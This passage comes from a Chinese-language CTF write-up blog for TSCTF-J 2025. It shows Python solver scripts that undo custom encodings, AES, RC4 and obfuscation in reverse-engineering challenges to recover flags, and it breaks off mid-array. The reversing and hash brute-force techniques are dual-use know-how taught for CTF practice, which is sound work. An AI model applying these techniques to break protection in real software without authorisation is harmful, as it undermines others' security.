class="number">0</span>]</span><br><span class="line">conv2_b = params[<span class="string">&#x27;conv2.bias&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">linear_w = params[<span class="string">&#x27;linear.weight&#x27;</span>]</span><br><span class="line">linear_b = params[<span class="string">&#x27;linear.bias&#x27;</span>]</span><br><span class="line">conv3_b = params[<span class="string">&#x27;conv3.bias&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">grid = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ciphertext.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        line = line.strip()</span><br><span class="line">        <span class="keyword">if</span> line:</span><br><span class="line">            grid.append([<span class="built_in">float</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> line.split()])</span><br><span class="line">Y = np.array(grid, dtype=np.float64)</span><br><span class="line">n = Y.shape[<span class="number">0</span>] - <span class="number">1</span>  <span class="comment"># 59 -&gt; n=58</span></span><br><span class="line"></span><br><span class="line">A = np.zeros((n, n), dtype=np.float64)</span><br><span class="line">Yp = Y - conv3_b</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        val = Yp[i, j]</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> j &gt; <span class="number">0</span>:</span><br><span class="line">            val += <span class="number">6</span> * A[i - <span class="number">1</span>, j - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span>:</span><br><span class="line">            val -= <span class="number">2</span> * A[i - <span class="number">1</span>, j]</span><br><span class="line">        <span class="keyword">if</span> j &gt; <span class="number">0</span>:</span><br><span class="line">            val -= <span class="number">3</span> * A[i, j - <span class="number">1</span>]</span><br><span class="line">        A[i, j] = val / <span class="number">9.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反线性</span></span><br><span class="line">v = A.reshape(-<span class="number">1</span>)</span><br><span class="line">rhs = v - linear_b</span><br><span class="line">u, *_ = np.linalg.lstsq(linear_w, rhs, rcond=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">bias = conv2_w * conv1_b + conv2_b</span><br><span class="line">bits = np.zeros(<span class="number">4</span> * n, dtype=<span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    val = <span class="built_in">int</span>(<span class="built_in">round</span>((u[j] - bias) / conv2_w))</span><br><span class="line">    val = <span class="built_in">max</span>(<span class="number">0</span>, <span class="built_in">min</span>(<span class="number">15</span>, val))</span><br><span class="line">    b0, b1, b2, b3 = val &amp; <span class="number">1</span>, (val &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>, (val &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>, (val &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span></span><br><span class="line">    bits[<span class="number">2</span> * j] = b0</span><br><span class="line">    bits[<span class="number">2</span> * j + <span class="number">1</span>] = b1</span><br><span class="line">    bits[<span class="number">2</span> * n + <span class="number">2</span> * j] = b2</span><br><span class="line">    bits[<span class="number">2</span> * n + <span class="number">2</span> * j + <span class="number">1</span>] = b3</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 输出flag</span></span><br><span class="line">chars = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, bits.size, <span class="number">8</span>):</span><br><span class="line">    byte = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> bits[k:k + <span class="number">8</span>]:</span><br><span class="line">        byte = (byte &lt;&lt; <span class="number">1</span>) | bit</span><br><span class="line">    chars.append(<span class="built_in">chr</span>(byte))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(chars))</span><br></pre></td></tr></table></figure>

<p>TSCTF-J{NotReverseButInverse}</p>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><p>这部分的话，主要第二天没时间做，又不想熬夜，最后pyd应该是有了大概的方向，xxtea，魔改了delta? 轮数可能不太一样,还需要动调，没时间做了，主要那个scratch3做了五个小时(纯属我眼瞎了)…</p>
<h3 id="Singin"><a href="#Singin" class="headerlink" title="Singin"></a>Singin</h3><p>逻辑很清晰，有个换表base64</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013111123283.png" alt="image-20251013111123283"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013111219947.png" alt="image-20251013111219947"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013111527189.png" alt="image-20251013111527189"></p>
<p>通过确定性置换对Base64字母表进行打乱</p>
<p>签到题，值得注意的有一个字节是重合的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">permute_alphabet</span>(<span class="params">alphabet</span>):</span><br><span class="line">    alphabet = <span class="built_in">list</span>(alphabet)</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        swap_idx = (<span class="number">7</span> * idx + <span class="number">5</span>) % <span class="number">64</span></span><br><span class="line">        alphabet[idx], alphabet[swap_idx] = alphabet[swap_idx], alphabet[idx]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(alphabet)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_base64</span>(<span class="params">plain, alphabet</span>):</span><br><span class="line">    encoded = <span class="built_in">bytearray</span>()</span><br><span class="line">    bit_buffer = <span class="number">0</span></span><br><span class="line">    bits_remaining = -<span class="number">6</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> plain:</span><br><span class="line">        bit_buffer = (bit_buffer &lt;&lt; <span class="number">8</span>) + byte</span><br><span class="line">        bits_remaining += <span class="number">8</span></span><br><span class="line">        <span class="keyword">while</span> bits_remaining &gt;= <span class="number">0</span>:</span><br><span class="line">            index = (bit_buffer &gt;&gt; bits_remaining) &amp; <span class="number">0x3F</span></span><br><span class="line">            encoded.append(<span class="built_in">ord</span>(alphabet[index]))</span><br><span class="line">            bits_remaining -= <span class="number">6</span></span><br><span class="line">    <span class="keyword">if</span> bits_remaining &gt;= -<span class="number">5</span>:</span><br><span class="line">        index = (bit_buffer &lt;&lt; <span class="number">8</span> &gt;&gt; (bits_remaining + <span class="number">8</span>)) &amp; <span class="number">0x3F</span></span><br><span class="line">        encoded.append(<span class="built_in">ord</span>(alphabet[index]))</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(encoded) % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">        encoded.append(<span class="built_in">ord</span>(<span class="string">&#x27;=&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(encoded)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_target</span>():</span><br><span class="line">    buf = <span class="built_in">bytearray</span>(<span class="number">40</span>)</span><br><span class="line">    buf[<span class="number">0</span>:<span class="number">8</span>] = (<span class="number">0x3D13023261347C23</span>).to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    buf[<span class="number">8</span>:<span class="number">16</span>] = (<span class="number">0x143402370D641267</span>).to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    buf[<span class="number">15</span>:<span class="number">23</span>] = (<span class="number">0x347024692B7A0314</span>).to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>) <span class="comment"># 坑在这里哦</span></span><br><span class="line">    buf[<span class="number">23</span>:<span class="number">31</span>] = (<span class="number">0x284202766B703261</span>).to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(buf[:<span class="number">31</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    alphabet = permute_alphabet(<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>)</span><br><span class="line">    keystream = custom_base64(<span class="string">b&quot;WelcomeToTSCTF&quot;</span>, alphabet)</span><br><span class="line">    target = build_target()</span><br><span class="line">    repeat = (keystream * ((<span class="built_in">len</span>(target) + <span class="built_in">len</span>(keystream) - <span class="number">1</span>) // <span class="built_in">len</span>(keystream)))[:<span class="built_in">len</span>(target)]</span><br><span class="line">    flag = <span class="built_in">bytes</span>(k ^ t <span class="keyword">for</span> k, t <span class="keyword">in</span> <span class="built_in">zip</span>(repeat, target))</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>TSCTF-J{We1c@me_t0_TS_CTF_2025}</p>
<h3 id="CryDancing"><a href="#CryDancing" class="headerlink" title="CryDancing"></a>CryDancing</h3><p>ios逆向</p>
<p>解压到本地IDA打开</p>
<p>objective</p>
<p>AES加密，挺清晰的</p>
<p>会把输入框里的字符串，做 AES-128-CBC 加密并转成 Base64，再与内置串比较决定弹窗内容。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013113221461.png" alt="image-20251013113221461"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013113320124.png" alt="image-20251013113320124"></p>
<p>枚举 “ABCDEFGHIJKLMNOPQRSTUVWXYZ” 的所有 4 位组合，找到 MD5 为 674040176a34f6c994003fe85badfc48 的候选，结果是 NOTD。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\soul\AppData\Roaming\Typora\typora-user-images\image-20251013114030136.png" alt="image-20251013114030136"></p>
<p>加密时把 NOTD 重复四次得到 16 字节密钥，IV 为 0x00000177（小端存放在首 4 字节）其余补 0，共 16 字节；AES-128-CBC + PKCS#7 padding。</p>
<p>CCCrypt就是AES哦</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line">TARGET_MD5 = <span class="string">&quot;674040176a34f6c994003fe85badfc48&quot;</span></span><br><span class="line">ALPHABET = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">CIPHERTEXT_B64 = <span class="string">&quot;bvOaEEh1F5pDkMpM6n5src+Jym4ineiRvbWRIidoLHD1KGuRk8vyRsDpQ4XGYtNKnQDvFBEnG3DsCDGqJ8Xv8g==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">derive_key_fragment</span>():</span><br><span class="line">    <span class="keyword">for</span> combo <span class="keyword">in</span> product(ALPHABET, repeat=<span class="number">4</span>):</span><br><span class="line">        candidate = <span class="string">&#x27;&#x27;</span>.join(combo)</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(candidate.encode()).hexdigest() == TARGET_MD5:</span><br><span class="line">            <span class="keyword">return</span> candidate</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">cipher_b64, key_fragment</span>):</span><br><span class="line">    full_key = (key_fragment * <span class="number">4</span>).encode()</span><br><span class="line">    iv = <span class="built_in">bytes</span>([<span class="number">0x77</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>] + [<span class="number">0x00</span>] * <span class="number">12</span>)</span><br><span class="line">    cipher_bytes = b64decode(cipher_b64)</span><br><span class="line">    cipher = AES.new(full_key, AES.MODE_CBC, iv)</span><br><span class="line">    plain = unpad(cipher.decrypt(cipher_bytes), AES.block_size)</span><br><span class="line">    <span class="keyword">return</span> plain.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key_fragment = derive_key_fragment()</span><br><span class="line">    flag = decrypt_flag(CIPHERTEXT_B64, key_fragment)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;key: <span class="subst">&#123;key_fragment&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>TSCTF-J{S0rry_th3_4nswer_h4s_n0thing_2_do_with_l7rics}</p>
<h3 id="听绿的秘密"><a href="#听绿的秘密" class="headerlink" title="听绿的秘密"></a>听绿的秘密</h3><p>对图像进行了加密，Secret.obf明显是混淆过了，看了下loader确认加密</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011150828847.png" alt="image-20251011150828847"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;Secret.obf&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    obf_bytes = f.read()</span><br><span class="line"></span><br><span class="line">class_bytes = <span class="built_in">bytes</span>((b - <span class="number">7</span>) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> b <span class="keyword">in</span> obf_bytes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;Secret.class&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(class_bytes)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;done&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011150940318.png" alt="image-20251011150940318"></p>
<p>再写逆向算法即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotate_right</span>(<span class="params">value, shift</span>):</span><br><span class="line">    <span class="keyword">return</span> ((value &gt;&gt; shift) | ((value &lt;&lt; (<span class="number">8</span> - shift)) &amp; <span class="number">0xFF</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">input_path, output_path</span>) :</span><br><span class="line">    data = <span class="built_in">bytearray</span>(input_path.read_bytes())</span><br><span class="line"></span><br><span class="line">    state = <span class="number">123</span></span><br><span class="line">    <span class="keyword">for</span> index, cipher <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        rotation = (index + state) % <span class="number">8</span></span><br><span class="line">        <span class="keyword">if</span> rotation == <span class="number">0</span>:</span><br><span class="line">            transformed = cipher</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            transformed = rotate_right(cipher, rotation)</span><br><span class="line">        plain = (transformed - ((index % <span class="number">251</span>) + state)) &amp; <span class="number">0xFF</span></span><br><span class="line">        data[index] = plain</span><br><span class="line">        state = (state + cipher + <span class="number">37</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    output_path.write_bytes(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    input_path = Path(<span class="string">&quot;Where_is_my_cat.png&quot;</span>)</span><br><span class="line">    output_path = Path(<span class="string">&quot;Cat_decrypted3.png&quot;</span>)</span><br><span class="line">    decrypt(input_path, output_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011151224682.png" alt="image-20251011151224682"></p>
<h3 id="Handler’s-Whisper"><a href="#Handler’s-Whisper" class="headerlink" title="Handler’s Whisper"></a>Handler’s Whisper</h3><p>看着没啥问题，其实会有个除0异常</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011151700663.png" alt="image-20251011151700663"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011151754527.png" alt="image-20251011151754527"></p>
<p>之后就是RC4解密了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011151838075.png" alt="image-20251011151838075"></p>
<p>注意然后对每个字节执行位重排：((c &amp; 0x03) &lt;&lt; 6) | ((c &amp; 0x0C) &lt;&lt; 2) | ((c &amp; 0xF0) &gt;&gt; 4)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x74</span>, <span class="number">0x6d</span>, <span class="number">0x32</span>, <span class="number">0x18</span>, <span class="number">0x70</span>, <span class="number">0x1e</span>, <span class="number">0x5e</span>,</span><br><span class="line">    <span class="number">0x64</span>, <span class="number">0x3c</span>, <span class="number">0xdc</span>, <span class="number">0xdf</span>, <span class="number">0xaf</span>, <span class="number">0xae</span>, <span class="number">0xa6</span>, <span class="number">0x3a</span>,</span><br><span class="line">    <span class="number">0xcd</span>, <span class="number">0xe3</span>, <span class="number">0x69</span>, <span class="number">0x41</span>, <span class="number">0xb9</span>, <span class="number">0xa2</span>, <span class="number">0x2f</span>, <span class="number">0xcd</span>,</span><br><span class="line">    <span class="number">0x17</span>, <span class="number">0xea</span>, <span class="number">0x1d</span>, <span class="number">0x80</span>, <span class="number">0x70</span>, <span class="number">0xfc</span>, <span class="number">0x58</span>, <span class="number">0xe4</span>,</span><br><span class="line">    <span class="number">0xad</span>, <span class="number">0xf0</span>, <span class="number">0x92</span>, <span class="number">0xcf</span>, <span class="number">0xe2</span>, <span class="number">0x37</span></span><br><span class="line">])</span><br><span class="line">KEY = <span class="string">b&quot;secret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_permute</span>(<span class="params">byte_val</span>):</span><br><span class="line">    <span class="keyword">return</span> ((byte_val &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | (((byte_val &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x03</span>) &lt;&lt; <span class="number">2</span>) | ((byte_val &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x03</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_keystream</span>(<span class="params">key, count</span>):</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + key[i % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        j = (j + s[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">        <span class="keyword">yield</span> s[(s[i] + s[j]) &amp; <span class="number">0xFF</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>():</span><br><span class="line">    stream = rc4_keystream(KEY, <span class="built_in">len</span>(enc))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(((inv_permute(b) - k) &amp; <span class="number">0xFF</span>) ^ <span class="number">0x44</span> <span class="keyword">for</span> b, k <span class="keyword">in</span> <span class="built_in">zip</span>(enc, stream))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(decrypt().decode())</span><br></pre></td></tr></table></figure>

<p>TSCTF-J{SEH_C@11b@ck_sp3@k$_w!th_RC4!}</p>
<h3 id="哭泣之子"><a href="#哭泣之子" class="headerlink" title="哭泣之子"></a>哭泣之子</h3><p>这个卡了挺久 我还以为是misc呢…… 看了眼瞎过了一遍没看到主逻辑，直接去看解码器了，后面看了下各个脚本的修改时间不大对，都是好几年前的，逻辑肯定在Cryingchild.dll里</p>
<p>exe没有主逻辑，主逻辑托管给了Cringchild.dll</p>
<p>Crying.dll中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011152548879.png" alt="image-20251011152548879"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011152617413.png" alt="image-20251011152617413"></p>
<p>追这个WaveOutEvent</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011152500623.png" alt="image-20251011152500623"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">array3 = [</span><br><span class="line">    <span class="number">871</span>, <span class="number">1654</span>, <span class="number">789</span>, <span class="number">1617</span>, <span class="number">1221</span>, <span class="number">2173</span>, <span class="number">871</span>, <span class="number">1724</span>, <span class="number">629</span>, <span class="number">1111</span>,</span><br><span class="line">    <span class="number">789</span>, <span class="number">1664</span>, <span class="number">783</span>, <span class="number">1579</span>, <span class="number">989</span>, <span class="number">1633</span>, <span class="number">1229</span>, <span class="number">2148</span>, <span class="number">891</span>, <span class="number">1703</span>,</span><br><span class="line">    <span class="number">1237</span>, <span class="number">2249</span>, <span class="number">1229</span>, <span class="number">2161</span>, <span class="number">1157</span>, <span class="number">2095</span>, <span class="number">1237</span>, <span class="number">2201</span>, <span class="number">1243</span>, <span class="number">2166</span>,</span><br><span class="line">    <span class="number">789</span>, <span class="number">1604</span>, <span class="number">941</span>, <span class="number">1669</span>, <span class="number">813</span>, <span class="number">1651</span>, <span class="number">845</span>, <span class="number">1633</span>, <span class="number">807</span>, <span class="number">1645</span>,</span><br><span class="line">    <span class="number">941</span>, <span class="number">1673</span>, <span class="number">971</span>, <span class="number">1863</span>, <span class="number">941</span>, <span class="number">1648</span>, <span class="number">789</span>, <span class="number">1620</span>, <span class="number">941</span>, <span class="number">1659</span>,</span><br><span class="line">    <span class="number">1255</span>, <span class="number">2157</span>, <span class="number">1167</span>, <span class="number">2121</span>, <span class="number">941</span>, <span class="number">1647</span>, <span class="number">807</span>, <span class="number">1662</span>, <span class="number">845</span>, <span 